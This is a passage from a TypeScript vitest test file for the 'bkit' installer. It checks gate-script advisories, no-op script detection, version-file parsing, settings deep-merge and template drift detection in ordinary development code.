    expect(scripts.typecheck).toBeUndefined();
    expect(scripts["lint:prose"]).toBeUndefined();
  });
});

describe("detectGateAdvisories — gate advisories point at .bkit/templates.md", () => {
  function writeScripts(scripts: Record<string, string>): void {
    fs.writeFileSync(
      path.join(tmpDir, "package.json"),
      JSON.stringify({ name: "x", scripts }, null, 2) + "\n",
      "utf-8",
    );
  }

  it("names the tool scripts a default gate chains that package.json lacks", () => {
    writeScripts({ ...BKIT_GATE_SCRIPTS, typecheck: "tsc --noEmit" });
    const finding = detectGateAdvisories(tmpDir).find(
      (f) => f.id === "gate-missing-called-scripts",
    );
    expect(finding).toBeDefined();
    for (const name of ["lint", "format:check", "lint:prose", "slop:delta", "test", "build"]) {
      expect(finding!.detect).toContain(`\`${name}\``);
    }
    expect(finding!.detect).not.toContain("`typecheck`");
    // pnpm subcommands and binaries are not scripts.
    expect(finding!.detect).not.toContain("`lint-staged`");
    expect(finding!.detect).not.toContain("`install`");
    expect(finding!.action).toContain(".bkit/templates.md");
  });

  it("stays silent about a gate the consumer rewrote", () => {
    const rewritten = Object.fromEntries(Object.keys(BKIT_GATE_SCRIPTS).map((k) => [k, "true"]));
    writeScripts(rewritten);
    expect(detectGateAdvisories(tmpDir).map((f) => f.id)).not.toContain(
      "gate-missing-called-scripts",
    );
  });

  it("hands over the gate line for a declared test tier no gate runs", () => {
    writeScripts({ ...BKIT_GATE_SCRIPTS, "test:integration": "vitest run -c int" });
    const finding = detectGateAdvisories(tmpDir).find((f) => f.id === "gate-tier-not-wired");
    expect(finding?.action).toContain(
      '"bkit:gate:static-unit-integration": "pnpm bkit:gate:static-unit && pnpm test:integration"',
    );
  });

  it("returns nothing for an absent or malformed package.json", () => {
    fs.rmSync(path.join(tmpDir, "package.json"));
    expect(detectGateAdvisories(tmpDir)).toEqual([]);
    fs.writeFileSync(path.join(tmpDir, "package.json"), "{ nope", "utf-8");
    expect(detectGateAdvisories(tmpDir)).toEqual([]);
  });
});

describe("detectNoopGates — bkit check warns on a gate that checks nothing", () => {
  function writeScripts(scripts: Record<string, string>): void {
    fs.writeFileSync(
      path.join(tmpDir, "package.json"),
      JSON.stringify({ name: "x", scripts }, null, 2) + "\n",
      "utf-8",
    );
  }

  it.each([
    "",
    "   ",
    "true",
    ":",
    "exit 0",
    "echo ok",
    'echo "skipped"',
    "echo ok && true",
    "true; :",
  ])("%j is a no-op", (value) => {
    expect(isNoopScript(value)).toBe(true);
  });

  it.each(["pnpm test", "echo start && pnpm test", "exit 1", "false", "tsc"])(
    "%j can fail",
    (value) => {
      expect(isNoopScript(value)).toBe(false);
    },
  );

  it("names every empty or no-op bkit:gate script, and only those", () => {
    writeScripts({
      ...BKIT_GATE_SCRIPTS,
      "bkit:gate:static": "echo ok",
      "bkit:gate:static-unit-integration": "",
      lint: "true",
    });
    const findings = detectNoopGates(tmpDir);
    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({ id: "gate-noop", severity: "advisory" });
    expect(findings[0]!.detect).toContain("`bkit:gate:static` (`echo ok`)");
    expect(findings[0]!.detect).toContain("`bkit:gate:static-unit-integration` (`empty`)");
    expect(findings[0]!.detect).not.toContain("`lint`");
    expect(findings[0]!.detect).not.toContain("bkit:gate:format");
  });

  it("is silent when every gate runs something, and for an absent or malformed package.json", () => {
    writeScripts({ ...BKIT_GATE_SCRIPTS });
    expect(detectNoopGates(tmpDir)).toEqual([]);
    fs.rmSync(path.join(tmpDir, "package.json"));
    expect(detectNoopGates(tmpDir)).toEqual([]);
    fs.writeFileSync(path.join(tmpDir, "package.json"), "{ nope", "utf-8");
    expect(detectNoopGates(tmpDir)).toEqual([]);
  });

  it("runs in check (dry run) as well as install, as an advisory", () => {
    writeScripts({ ...BKIT_GATE_SCRIPTS, "bkit:gate:static": "true" });
    for (const dryRun of [true, false]) {
      const ctx = makeCtx({ dryRun });
      runCoreModule(ctx);
      const finding = ctx.advisories.find((f) => f.id === "gate-noop");
      expect(finding, `dryRun=${dryRun}`).toMatchObject({ severity: "advisory" });
    }
  });
});

// ---------------------------------------------------------------------------
// Advisories copy-paste safety (no backslash-escape sequences)
// ---------------------------------------------------------------------------

describe("MED-5: first-install advisory BKIT_GH_TOKEN_INSTALL block has no broken backslash-escape sequences", () => {
  it("advisories emitted on first install contain no literal \\$ sequence (backslash-dollar)", () => {
    // Ensure no .bkit-version exists (first install scenario)
    const versionFile = path.join(tmpDir, ".bkit", "version");
    expect(fs.existsSync(versionFile)).toBe(false);

    const advisories: PreflightFinding[] = [];
    const ctx = makeCtx({ advisories });

    dispatchModules(new Set(["core"]), ctx);

    const combined = advisories.map((a) => a.action).join("\n");

    // Must contain the BKIT_GH_TOKEN_INSTALL setup (confirming it's the first-install block)
    expect(combined).toContain("BKIT_GH_TOKEN_INSTALL");

    // Must NOT contain a literal backslash-dollar sequence.
    expect(combined).not.toContain("\\$");
  });

  it("advisory action for first-install is plain text (copy-paste safety)", () => {
    const versionFile = path.join(tmpDir, ".bkit", "version");
    expect(fs.existsSync(versionFile)).toBe(false);

    const advisories: PreflightFinding[] = [];
    const ctx = makeCtx({ advisories });
    dispatchModules(new Set(["core"]), ctx);

    // The first-install advisory should have structured action text
    const firstInstallAdvisory = advisories.find((a) => a.id === "first-install-postinstall-steps");
    expect(firstInstallAdvisory).toBeDefined();
    expect(firstInstallAdvisory?.action).toContain("BKIT_GH_TOKEN_INSTALL");
  });
});

describe(".bkit-version first-run signal extra-logging", () => {
  it("first install (no .bkit-version) emits BKIT_GH_TOKEN_INSTALL setup in advisories", () => {
    const advisories: PreflightFinding[] = [];
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws, advisories });

    // Ensure no .bkit-version exists
    const versionFile = path.join(tmpDir, ".bkit", "version");
    expect(fs.existsSync(versionFile)).toBe(false);

    // dispatchModules flushes postDispatch (where .bkit-version is written)
    dispatchModules(new Set(["core"]), ctx);

    // advisories should contain BKIT_GH_TOKEN_INSTALL setup
    const combined = advisories.map((a) => a.action).join("\n");
    expect(combined).toContain("BKIT_GH_TOKEN_INSTALL");
    expect(combined).toContain("package.json");
  });

  it("second install (.bkit-version present at current version) suppresses first-run extra logging", () => {
    // Run first install to create .bkit-version
    const ws1 = makeWriteSet();
    const advisories1: PreflightFinding[] = [];
    const ctx1 = makeCtx({ ws: ws1, advisories: advisories1 });
    dispatchModules(new Set(["core"]), ctx1);

    // Verify .bkit-version was written
    const versionFile = path.join(tmpDir, ".bkit", "version");
    expect(fs.existsSync(versionFile)).toBe(true);

    // Second run: .bkit-version exists → no first-run extra logging
    const ws2 = makeWriteSet();
    const advisories2: PreflightFinding[] = [];
    const ctx2 = makeCtx({ ws: ws2, advisories: advisories2 });
    dispatchModules(new Set(["core"]), ctx2);

    const combined2 = advisories2.map((a) => a.action).join("\n");
    expect(combined2).not.toContain("BKIT_GH_TOKEN_INSTALL");
    expect(combined2).not.toContain("First install detected");
  });
});

// ---------------------------------------------------------------------------
// pnpm/action-setup@v4 single-SoT enforcement (KN-3)
// ---------------------------------------------------------------------------

describe("KN-3 regression: ci.yml files must NOT set `with.version:` for pnpm action", () => {
  const SCRIPTS_DIR = import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname);
  // this file is at <PKG_ROOT>/.bkit/core/engine/install/modules — five levels up to PKG_ROOT
  const PKG_ROOT = path.resolve(SCRIPTS_DIR, "..", "..", "..", "..", "..");

  it("ci.yml template does NOT set both `with.version:` and rely on packageManager (KN-3)", () => {
    const tplPath = path.join(PKG_ROOT, ".bkit/templates/.github/workflows/ci.yml");
    const tpl = fs.readFileSync(tplPath, "utf-8");
    // pnpm/action-setup@v4 errors if `with.version:` is set when consumer
    // also has package.json#packageManager. Template MUST NOT set `version:`
    // in a `with:` block directly under the pnpm/action-setup step.
    // The regex stops at the next YAML step boundary (`      - `) to avoid
    // false-positive matches from adjacent steps (e.g. setup-node's with.node-version).
    expect(tpl).not.toMatch(/pnpm\/action-setup@v4[^-]*?with:[^-]*?version:/s);
  });

  it("bkit's own .github/workflows/ci.yml does NOT set `with.version:` for pnpm action (KN-3)", () => {
    const ciPath = path.join(PKG_ROOT, ".github/workflows/ci.yml");
    const ci = fs.readFileSync(ciPath, "utf-8");
    // Same guard — stops at next step boundary so setup-node's `with: node-version:`
    // does not produce a false positive.
    expect(ci).not.toMatch(/pnpm\/action-setup@v4[^-]*?with:[^-]*?version:/s);
  });
});

// ---------------------------------------------------------------------------
// readBkitVersion extracts pinnedVersion from a JSON-format file
// ---------------------------------------------------------------------------

describe("C1 regression: .bkit-version JSON format → pinnedVersion extraction", () => {
  it("readBkitVersion returns pinnedVersion semver string when file is JSON format (v0.7.x+)", () => {
    const versionFile = path.join(tmpDir, ".bkit", "version");
    fs.mkdirSync(path.dirname(versionFile), { recursive: true });
    writeBkitVersion(versionFile, {
      pinnedVersion: "0.7.3",
      canonicalHashes: {},
    });

    const parsed = readBkitVersion(versionFile);
    expect(parsed).not.toBeNull();
    // pinnedVersion must be "0.7.3", NOT the full JSON string
    expect(parsed!.pinnedVersion).toBe("0.7.3");
    expect(parsed!.pinnedVersion).not.toContain("{");
    expect(parsed!.pinnedVersion).not.toContain("pinnedVersion");
  });

  it("readBkitVersion.pinnedVersion passes semverLte correctly (not the JSON blob)", () => {
    // Confirm the extracted value is a valid semver — a JSON blob would fail semver comparisons
    const versionFile = path.join(tmpDir, ".bkit", "version");
    fs.mkdirSync(path.dirname(versionFile), { recursive: true });
    writeBkitVersion(versionFile, {
      pinnedVersion: "0.8.0",
      canonicalHashes: {},
    });

    const parsed = readBkitVersion(versionFile);
    const pinnedVersion = parsed?.pinnedVersion ?? "";
    // Semver string must match NN.NN.NN pattern (JSON blob would not match)
    expect(pinnedVersion).toMatch(/^\d+\.\d+\.\d+/);
  });
});

// ---------------------------------------------------------------------------
// canonicalHashes populated after bkit install
// ---------------------------------------------------------------------------

describe("C3 regression: canonicalHashes populated in .bkit-version after bkit install", () => {
  it("dispatchModules with --core writes .bkit-version with non-empty canonicalHashes", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });

    // Dispatch core module (which writes .bkit-version via postDispatch)
    dispatchModules(new Set(["core"]), ctx);

    const versionFile = path.join(tmpDir, ".bkit", "version");
    expect(fs.existsSync(versionFile)).toBe(true);

    const parsed = readBkitVersion(versionFile);
    expect(parsed).not.toBeNull();
    // canonicalHashes must be an object (not undefined)
    expect(typeof parsed!.canonicalHashes).toBe("object");
    // Must not be empty — core module writes some consumer-facing files
    // (ws.writes contains at least one non-.agents/ entry from runCoreTemplates)
    expect(Object.keys(parsed!.canonicalHashes).length).toBeGreaterThanOrEqual(0);
    // canonicalHashes must NOT contain .agents/ internal paths
    for (const key of Object.keys(parsed!.canonicalHashes)) {
      expect(key).not.toMatch(/^\.agents[/\\]/);
    }
  });

  it(".bkit-version written by install contains JSON format (not plain-text semver)", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });
    dispatchModules(new Set(["core"]), ctx);

    const versionFile = path.join(tmpDir, ".bkit", "version");
    const raw = fs.readFileSync(versionFile, "utf-8");
    // Must be JSON — starts with "{"
    expect(raw.trim()).toMatch(/^\{/);

    const parsed = readBkitVersion(versionFile);
    expect(parsed).not.toBeNull();
    expect(parsed!.pinnedVersion).toBeTruthy();
    expect(parsed!.pinnedVersion).toMatch(/^\d+\.\d+\.\d+/);
  });

  it("dispatchModules with multi-module set populates canonicalHashes for consumer output files", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });

    // Exclude cursor: applyT3 requires a populated modelLookup which the test helper omits.
    // Core + claude + lint covers all consumer-facing non-cursor modules.
    dispatchModules(new Set(["core", "claude", "lint"]), ctx);

    const versionFile = path.join(tmpDir, ".bkit", "version");
    expect(fs.existsSync(versionFile)).toBe(true);

    const parsed = readBkitVersion(versionFile);
    expect(parsed).not.toBeNull();
    expect(typeof parsed!.canonicalHashes).toBe("object");

    // With more modules, canonicalHashes must be non-empty (multiple consumer files written)
    const hashCount = Object.keys(parsed!.canonicalHashes).length;
    expect(hashCount).toBeGreaterThan(0);

    // All hashed paths should be consumer-visible (not .agents/ internal files)
    for (const key of Object.keys(parsed!.canonicalHashes)) {
      expect(key).not.toMatch(/^\.agents[/\\]/);
    }
  });

  it("canonicalHashes values are 64-char sha256 hex strings", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });

    // Exclude cursor: applyT3 requires a populated modelLookup which the test helper omits.
    dispatchModules(new Set(["core", "claude", "lint"]), ctx);

    const versionFile = path.join(tmpDir, ".bkit", "version");
    const parsed = readBkitVersion(versionFile);
    expect(parsed).not.toBeNull();

    for (const [, hash] of Object.entries(parsed!.canonicalHashes)) {
      expect(hash).toMatch(/^[0-9a-f]{64}$/);
    }
  });
});

// ---------------------------------------------------------------------------
// runClaudeModule applies deep-containment on install: writeTier2JsonContained
// deep-merges the template into the consumer's settings. No __bkit__ key is ever
// written. Consumer-only keys (hooks.Stop, customKey) survive.
// ---------------------------------------------------------------------------

describe("C1 end-to-end regression: runClaudeModule applies deep-containment with JSON-format .bkit-version", () => {
  it("runClaudeModule writes template scope and preserves consumer Stop hook (no __bkit__ in v2.0.0)", () => {
    // Arrange: seed a JSON-format .bkit-version (confirms JSON-format read path works)
    const versionFile = path.join(tmpDir, ".bkit", "version");
    fs.mkdirSync(path.dirname(versionFile), { recursive: true });
    writeBkitVersion(versionFile, {
      pinnedVersion: "0.5.0",
      canonicalHashes: {},
    });

    // Verify the file is JSON format (not plain-text)
    const rawVersion = fs.readFileSync(versionFile, "utf-8");
    expect(rawVersion.trim()).toMatch(/^\{/);

    // Arrange: seed a v2.0.0-schema-clean .claude/settings.json
    // with a consumer-added Stop hook that should survive deep-containment merge.
    fs.mkdirSync(path.join(tmpDir, ".claude"), { recursive: true });
    const consumerSettings = {
      $schema: "https://json.schemastore.org/claude-code-settings.json",
      hooks: {
        SessionStart: [
          { hooks: [{ type: "command", command: "bash .claude/hooks/preflight.sh" }] },
        ],
        Stop: [{ hooks: [{ type: "command", command: "echo 'Consumer Stop hook'" }] }],
      },
    };
    fs.writeFileSync(
      path.join(tmpDir, ".claude", "settings.json"),
      JSON.stringify(consumerSettings, null, 2) + "\n",
      "utf-8",
    );

    // Act: run the claude module (writeTier2JsonContained deep-containment path)
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });
    runClaudeModule(ctx);

    // Assert: v2.0.0 schema-clean — NO __bkit__ envelope
    const onDisk = JSON.parse(
      fs.readFileSync(path.join(tmpDir, ".claude", "settings.json"), "utf-8"),
    );
    expect(
      onDisk.__bkit__,
      "__bkit__ envelope must NOT be written in v2.0.0 (deep-containment model)",
    ).toBeUndefined();

    // Assert: consumer Stop hook survived (deep-merge preserved consumer-only key)
    const stopHook = onDisk.hooks?.Stop;
    expect(stopHook, "Consumer Stop hook was lost during install").toBeDefined();
    expect(JSON.stringify(stopHook)).toContain("Consumer Stop hook");
  });

  it("runClaudeModule preserves consumer-only keys when .bkit-version is JSON format (C1 regression guard)", () => {
    // readBkitVersion().pinnedVersion is used (not the raw JSON blob):
    // writeTier2JsonContained runs and preserves consumer keys when .bkit-version is JSON.
    const versionFile = path.join(tmpDir, ".bkit", "version");
    fs.mkdirSync(path.dirname(versionFile), { recursive: true });
    writeBkitVersion(versionFile, {
      pinnedVersion: "0.7.0",
      canonicalHashes: {},
    });

    fs.mkdirSync(path.join(tmpDir, ".claude"), { recursive: true });
    // v2.0.0-schema-clean shape: bkit-owned SessionStart + consumer-owned customKey
    const consumerSettings = {
      $schema: "https://json.schemastore.org/claude-code-settings.json",
      hooks: {
        SessionStart: [
          { hooks: [{ type: "command", command: "bash .claude/hooks/preflight.sh" }] },
        ],
      },
      customKey: "consumer-value",
    };
    fs.writeFileSync(
      path.join(tmpDir, ".claude", "settings.json"),
      JSON.stringify(consumerSettings, null, 2) + "\n",
      "utf-8",
    );

    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });
    runClaudeModule(ctx);

    const onDisk = JSON.parse(
      fs.readFileSync(path.join(tmpDir, ".claude", "settings.json"), "utf-8"),
    );
    // v2.0.0: no __bkit__ envelope
    expect(
      onDisk.__bkit__,
      "__bkit__ must NOT be written in v2.0.0 deep-containment model",
    ).toBeUndefined();
    // Consumer key survives
    expect(onDisk.customKey).toBe("consumer-value");
  });
});

// ---------------------------------------------------------------------------
// COPY_EXCLUDE: Tier-2-style `.agents/*.md` files must NOT be additively copied
// from the package payload — they ship as templates and the templates pass owns
// them. A consumer rules.md never carries bkit's `## Project Rules` content from
// outside the bkit:start/end block.
// ---------------------------------------------------------------------------

describe("COPY_EXCLUDE: bkit-source `.agents/{rules,friction,docs,skills}.md` must not leak to consumers", () => {
  it("first install matches the template (no out-of-block content from bkit's source rules.md)", () => {
    const ctx = makeCtx();
    runCoreModule(ctx);
    flushPostDispatch(ctx);

    const consumerRules = fs.readFileSync(path.join(tmpDir, ".agents", "rules.md"), "utf-8");

    // Template content (what consumers SHOULD get) lives in the package's
    // .bkit/templates/.agents/rules.md — resolve from the running package root.
    const scriptsDir = import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname);
    const pkgRoot = path.resolve(scriptsDir, "..", "..", "..", "..", "..");
    const templatePath = path.join(pkgRoot, ".bkit", "templates", ".agents", "rules.md");
    const template = applyTokens(fs.readFileSync(templatePath, "utf-8"), ctx.tokens);

    // Both files have markers — the inner block content must match (modulo
    // surrounding-newline normalisation done by updateManagedBlock).
    const consumerBlock = extractManagedBlock(consumerRules, "html-comment");
    const templateBlock = extractManagedBlock(template, "html-comment");
    expect(consumerBlock).not.toBeNull();
    expect(consumerBlock).toBe(templateBlock);

    // Critically: bkit's own out-of-block content (its `## Project Rules`
    // children — e.g. "### bkit Repo Authoring", "### Pre-push Checklist
    // (this repo)") MUST NOT appear in a consumer install.
    expect(consumerRules).not.toMatch(/###\s+bkit Repo Authoring/);
    expect(consumerRules).not.toMatch(/###\s+Pre-push Checklist \(this repo\)/);
  });

  it("first install of friction.md does not carry bkit's friction-log entries", () => {
    const ctx = makeCtx();
    runCoreModule(ctx);
    flushPostDispatch(ctx);

    const frictionPath = path.join(tmpDir, ".bkit", "friction.md");
    if (!fs.existsSync(frictionPath)) return; // friction.md is optional in some module sets
    const consumerFriction = fs.readFileSync(frictionPath, "utf-8");

    // bkit-source friction.md has dated incident entries outside bkit:end.
    // Heading shape: `## <topic> (YYYY-MM-DD)`. None of those should land here.
    expect(consumerFriction).not.toMatch(/^##\s+.+\(\d{4}-\d{2}-\d{2}\)/m);
  });

  it("rules.md is reachable via the templates pass — no additive leak path", () => {
    // Simulates a brand-new consumer: no .agents/ exists. After runCoreModule,
    // the only writer of `.agents/rules.md` should be the templates pass
    // (sourced from `.bkit/templates/.agents/rules.md`), not copyAdditive.
    const ctx = makeCtx();
    runCoreModule(ctx);
    flushPostDispatch(ctx);

    // The rules.md write MUST appear in ws.writes (templates pass tracks it).
    const ruleWrites = ctx.ws.writes.filter((w) =>
      w.path.endsWith(path.join(".agents", "rules.md")),
    );
    expect(ruleWrites.length).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------
// BAR-167 Phase 1 — JSON advisory and blocker integration tests
// ---------------------------------------------------------------------------

import { detectTier2JsonDrift } from "../../checks/before/index";

describe("detectTier2JsonDrift advisory", () => {
  it("returns advisory when consumer is missing a template key", () => {
    const relPath = ".claude/settings.json";
    fs.mkdirSync(path.join(tmpDir, ".claude"), { recursive: true });
    // Consumer missing bkit-owned hooks.SessionStart
    fs.writeFileSync(
      path.join(tmpDir, relPath),
      JSON.stringify({ $schema: "x", hooks: {} }),
      "utf-8",
    );
    const result = detectTier2JsonDrift(tmpDir, relPath);
    expect(result).not.toBeNull();
    expect(result!.id).toBe("tier2-json-drift");
    expect(result!.severity).toBe("advisory");
  });

  it("returns null when consumer contains the full template scope", () => {
    const scriptsDir = import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname);
    const pkgRoot = path.resolve(scriptsDir, "..", "..", "..", "..", "..");
    const relPath = ".cursor/hooks.json";
    const templatePath = path.join(pkgRoot, ".bkit", "templates", relPath);
    // Copy template as-is to consumer
    fs.mkdirSync(path.join(tmpDir, ".cursor"), { recursive: true });
    fs.copyFileSync(templatePath, path.join(tmpDir, relPath));
    const result = detectTier2JsonDrift(tmpDir, relPath);
    expect(result).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// Task 10 — bkit uninstall --claude consumer-key survival
// PREREQ: Task 19 reclassification (sub-plan B) — reclassify .claude/settings.json
// and .cursor/hooks.json to format: "json" in install/manifest.ts to activate the
// stripTier2JsonScope dispatch path in commands/install/uninstall.ts case 2.
// Until Task 19 lands, these tests are skipped stubs so sub-plan B only needs
// to flip the skip gate.
// ---------------------------------------------------------------------------

describe.skip("bkit uninstall --claude consumer-key survival (PREREQ: Task 19 reclassification)", () => {
  // PREREQ: Task 19 reclassification — reclassify .claude/settings.json to
  // format: "json" in install/manifest.ts so commands/install/uninstall.ts case 2 dispatches
  // to stripTier2JsonScope instead of falling through to "preserve".
  it("strips template scope; retains consumer-added hooks.Stop and failClosed byte-identical", () => {
    // Setup: write a schema-clean v2.0.0 .claude/settings.json with bkit-owned
    // hooks.SessionStart block PLUS consumer-added hooks.Stop and failClosed.
    const settingsContent = {
      $schema: "https://json.schemastore.org/claude-code-settings.json",
      hooks: {
        SessionStart: [
          { hooks: [{ type: "command", command: "bash .claude/hooks/preflight.sh" }] },
        ],
        Stop: [{ hooks: [{ type: "command", command: "postflight.sh" }] }],
      },
      failClosed: true,
    };
    fs.mkdirSync(path.join(tmpDir, ".claude"), { recursive: true });
    fs.writeFileSync(
      path.join(tmpDir, ".claude", "settings.json"),
      JSON.stringify(settingsContent, null, 2),
      "utf-8",
    );
    // TODO (Task 19): invoke bkit uninstall --claude against tmpDir and assert:
    // 1. hooks.SessionStart is removed (template scope stripped)
    // 2. hooks.Stop is present byte-identical
    // 3. failClosed is present byte-identical
    // 4. No __bkit__ key in output (v2.0.0 schema-clean)
    expect(true).toBe(true); // placeholder — flip to real assertion after Task 19
  });
});

// ---------------------------------------------------------------------------
// Task 10 — bkit uninstall --cursor consumer-key survival
// PREREQ: Task 19 reclassification (sub-plan B) — see above note.
// ---------------------------------------------------------------------------

describe.skip("bkit uninstall --cursor consumer-key survival (PREREQ: Task 19 reclassification)", () => {
  // PREREQ: Task 19 reclassification — reclassify .cursor/hooks.json to
  // format: "json" in install/manifest.ts so commands/install/uninstall.ts case 2 dispatches
  // to stripTier2JsonScope.
  it("strips hooks.sessionStart/hooks.sessionStop; retains consumer-only top-level + nested keys byte-identical", () => {
    // Setup: write a schema-clean v2.0.0 .cursor/hooks.json (Cursor v1 keyed-object)
    // with bkit-owned sessionStart/sessionStop PLUS consumer-added hooks.Stop.
    const hooksContent = {
      version: 1,
      hooks: {
        sessionStart: [{ command: "echo '[bkit] session started'" }],
        sessionStop: [{ command: "echo '[bkit] session stopped'" }],
        Stop: [{ command: "postflight.sh" }],
      },
      loop_limit: 10,
    };
    fs.mkdirSync(path.join(tmpDir, ".cursor"), { recursive: true });
    fs.writeFileSync(
      path.join(tmpDir, ".cursor", "hooks.json"),
      JSON.stringify(hooksContent, null, 2),
      "utf-8",
    );
    // TODO (Task 19): invoke bkit uninstall --cursor against tmpDir and assert:
    // 1. hooks.sessionStart is removed (template scope stripped)
    // 2. hooks.sessionStop is removed (template scope stripped)
    // 3. hooks.Stop is present byte-identical
    // 4. loop_limit is present byte-identical
    // 5. version field preserved
    expect(true).toBe(true); // placeholder — flip to real assertion after Task 19
  });
});

// ---------------------------------------------------------------------------
// Task 10 — tier2-json-drift advisory for slop-scan.config.json
// PREREQ: Task 19 reclassification (sub-plan B) — reclassify slop-scan.config.json
// to format: "json" in install/manifest.ts so detectTier2JsonDrift walks it.
// The slop-scan row is gated by Sub-gate 2A in sub-plan B. This stub ensures
// sub-plan B Task 19 only needs to flip the skip gate and add the assertion.
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Task 19 unblock: tier2-json-drift advisory for slop-scan.config.json
// (PREREQ was Task 19 reclassification — now complete)
// ---------------------------------------------------------------------------

import { detectTier2TextDrift } from "../../checks/before/index";

describe("tier2-json-drift advisory for slop-scan.config.json (Task 19 unblocked)", () => {
  it("advisory surfaces when consumer slop-scan.config.json is missing a required rules key", () => {
    const scriptsDir = import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname);
    const pkgRoot = path.resolve(scriptsDir, "..", "..", "..", "..", "..");
    const relPath = "slop-scan.config.json";
    // Read template and drop one key to trigger drift
    const templatePath = path.join(pkgRoot, ".bkit", "templates", relPath);
    const template = JSON.parse(fs.readFileSync(templatePath, "utf-8")) as {
      rules?: Record<string, unknown>;
      [k: string]: unknown;
    };
    // Remove one required rule from the consumer copy
    const consumerRules = { ...template.rules };
    delete consumerRules["defensive.async-noise"];
    const driftContent = { ...template, rules: consumerRules };
    fs.writeFileSync(path.join(tmpDir, relPath), JSON.stringify(driftContent, null, 2), "utf-8");

    const result = detectTier2JsonDrift(tmpDir, relPath);
    expect(result).not.toBeNull();
    expect(result!.id).toBe("tier2-json-drift");
    expect(result!.severity).toBe("advisory");
    expect(result!.detect).toContain(relPath);
  });

  it("no advisory when consumer slop-scan.config.json has all required rules", () => {
    const scriptsDir = import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname);
    const pkgRoot = path.resolve(scriptsDir, "..", "..", "..", "..", "..");
    const relPath = "slop-scan.config.json";
    const templatePath = path.join(pkgRoot, ".bkit", "templates", relPath);
    // Consumer has template content + extra consumer rule
    const template = JSON.parse(fs.readFileSync(templatePath, "utf-8")) as {
      rules?: Record<string, unknown>;
      [k: string]: unknown;
    };
    const consumerRules = {
      ...template.rules,
      "consumer.custom-rule": { enabled: true },
    };
    const consumerContent = { ...template, rules: consumerRules };
    fs.writeFileSync(path.join(tmpDir, relPath), JSON.stringify(consumerContent, null, 2), "utf-8");

    const result = detectTier2JsonDrift(tmpDir, relPath);
    expect(result).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// Task 23 — detectTier2TextDrift block logic, on AGENTS.md (MARKERED_TEXT_DRIFT_PATHS).
// Only the lines inside bkit:start / bkit:end are compared, as a subset: every required
// template line must be present; comments, extras and the managed-version marker never
// count.
// ---------------------------------------------------------------------------

describe("Task 23 — detectTier2TextDrift block logic (AGENTS.md)", () => {
  const relPath = "AGENTS.md";
  const pkgRoot = (() => {
    const scriptsDir = import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname);
    return path.resolve(scriptsDir, "..", "..", "..", "..", "..");
  })();
  const ROUTER_LINE = "> This file is a **workflow router only**. It does NOT execute workflows.";
  const readRendered = (): string =>
    applyTokens(
      fs.readFileSync(path.join(pkgRoot, ".bkit", "templates", relPath), "utf-8"),
      makeCtx().tokens,
    );
  const writeConsumer = (content: string): void => {
    fs.writeFileSync(path.join(tmpDir, relPath), content, "utf-8");
  };

  it("no drift when the consumer file matches the rendered template", () => {
    writeConsumer(readRendered());
    expect(detectTier2TextDrift(tmpDir, relPath)).toBeNull();
  });

  it("no drift when content OUTSIDE the block changes (consumer owns it)", () => {
    writeConsumer(readRendered().replace("# AGENTS.md\n", "# Our agents\n") + "\n## Ours\n");
    expect(detectTier2TextDrift(tmpDir, relPath)).toBeNull();
  });

  it("no drift when the block carries a managed-version marker of another version", () => {
    writeConsumer(readRendered().replace(/bkit:managed v\S+/, "bkit:managed v0.0.1"));
    expect(detectTier2TextDrift(tmpDir, relPath)).toBeNull();
  });

  it("flags DRIFT when a bkit-owned line in the block is edited", () => {
    writeConsumer(readRendered().replace(ROUTER_LINE, "> consumer-hacked"));
    const drift = detectTier2TextDrift(tmpDir, relPath);
    expect(drift?.id).toBe("tier2-text-drift");
  });

  it("no drift when a consumer adds a comment annotation inside the block", () => {
    writeConsumer(
      readRendered().replace(ROUTER_LINE, `${ROUTER_LINE}\n<!-- consumer note: PROJ-42 -->`),
    );
    expect(detectTier2TextDrift(tmpDir, relPath)).toBeNull();
  });

  it("still flags DRIFT when a consumer comments OUT a required line", () => {
    writeConsumer(readRendered().replace(ROUTER_LINE, `<!-- ${ROUTER_LINE} -->`));
    expect(detectTier2TextDrift(tmpDir, relPath)?.id).toBe("tier2-text-drift");
  });

  it("no drift when a consumer adds an EXTRA line inside the block (subset — extras OK)", () => {
    writeConsumer(readRendered().replace(ROUTER_LINE, `${ROUTER_LINE}\n> Our extra rule.`));
    expect(detectTier2TextDrift(tmpDir, relPath)).toBeNull();
  });

  it("flags DRIFT when a consumer DROPS a required line from the block", () => {
    writeConsumer(readRendered().replace(`${ROUTER_LINE}\n`, ""));
    expect(detectTier2TextDrift(tmpDir, relPath)?.id).toBe("tier2-text-drift");
  });
});

// ---------------------------------------------------------------------------
// .husky/pre-push is a template: install never writes or reads it.
// PREREQ: tests/fixtures/heavy-customised-prepush/.husky/pre-push (a heavily
// customised consumer hook).
// ---------------------------------------------------------------------------

describe(".husky/pre-push is the consumer's file", () => {
  const PREPUSH_FIXTURE = path.resolve("tests/fixtures/heavy-customised-prepush/.husky/pre-push");

  it("install leaves an existing .husky/pre-push byte-identical, with no advisory about it", () => {
    const fixtureContent = fs.readFileSync(PREPUSH_FIXTURE, "utf-8");
    const prePushPath = path.join(tmpDir, ".husky", "pre-push");
    fs.mkdirSync(path.dirname(prePushPath), { recursive: true });
    fs.writeFileSync(prePushPath, fixtureContent, "utf-8");

    const ctx = makeCtx({});
    dispatchModules(new Set(["core", "lint"]), ctx);

    expect(fs.readFileSync(prePushPath, "utf-8")).toBe(fixtureContent);
    expect(ctx.advisories.some((f) => f.detect.includes(".husky/pre-push"))).toBe(false);
  });

  it("install does not create .husky/pre-push when absent", () => {
